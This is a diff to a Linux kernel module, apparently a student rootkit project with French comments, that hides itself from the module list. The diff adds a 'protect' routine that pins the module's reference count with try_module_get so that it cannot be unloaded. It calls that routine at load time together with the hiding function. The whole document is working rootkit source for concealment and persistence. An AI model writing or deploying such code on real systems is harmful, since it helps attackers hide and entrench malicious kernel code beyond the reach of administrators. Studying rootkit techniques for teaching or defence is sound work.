@@ -6,7 +6,7 @@
 // licence du module (GPL = General Public License) en gros opensource
 // le LKM sera marqué comme propriétaire si on ne mets pas ca et si le noyau impose des restrictions sur les modules propriétaires, ca peut poser des problemes
 MODULE_LICENSE("GPL");
-MODULE_AUTHOR("victor, marouane, mina, axel");
+MODULE_AUTHOR("victor");
 // pour avoir la description quand on fait modinfo 
 MODULE_DESCRIPTION("Hide LKM");
 MODULE_VERSION("0.01");
@@ -39,11 +39,41 @@ void hideme(void)
     hidden = 1; 
 }
 
+// ========== PROTECT ==========
+int is_protected = 0;
+
+void protect(void)
+{
+    if (is_protected) {
+        return;
+    }
+
+    try_module_get(THIS_MODULE);
+
+    is_protected = 1;
+}
+
+void unprotect(void)
+{
+    if (!is_protected) {
+        return;
+    }
+
+    module_put(THIS_MODULE);
+
+    is_protected = 0;
+}
+
+
+// ========== END PROTECT ==========
+
 // fonction éxécuté quand on charge le module dans le noyau
 // __init ->  utilisé qu'à l'initialisation et que le code sera libéré après cette phase pour économiser de la mémoire
 static int __init rootkit_init(void)
 {
+
     hideme();
+    protect();
     return 0;
 }
 
@@ -51,6 +81,7 @@ static int __init rootkit_init(void)
 static void __exit rootkit_exit(void)
 {
     showme();
+    unprotect();
 }
 
 module_init(rootkit_init);
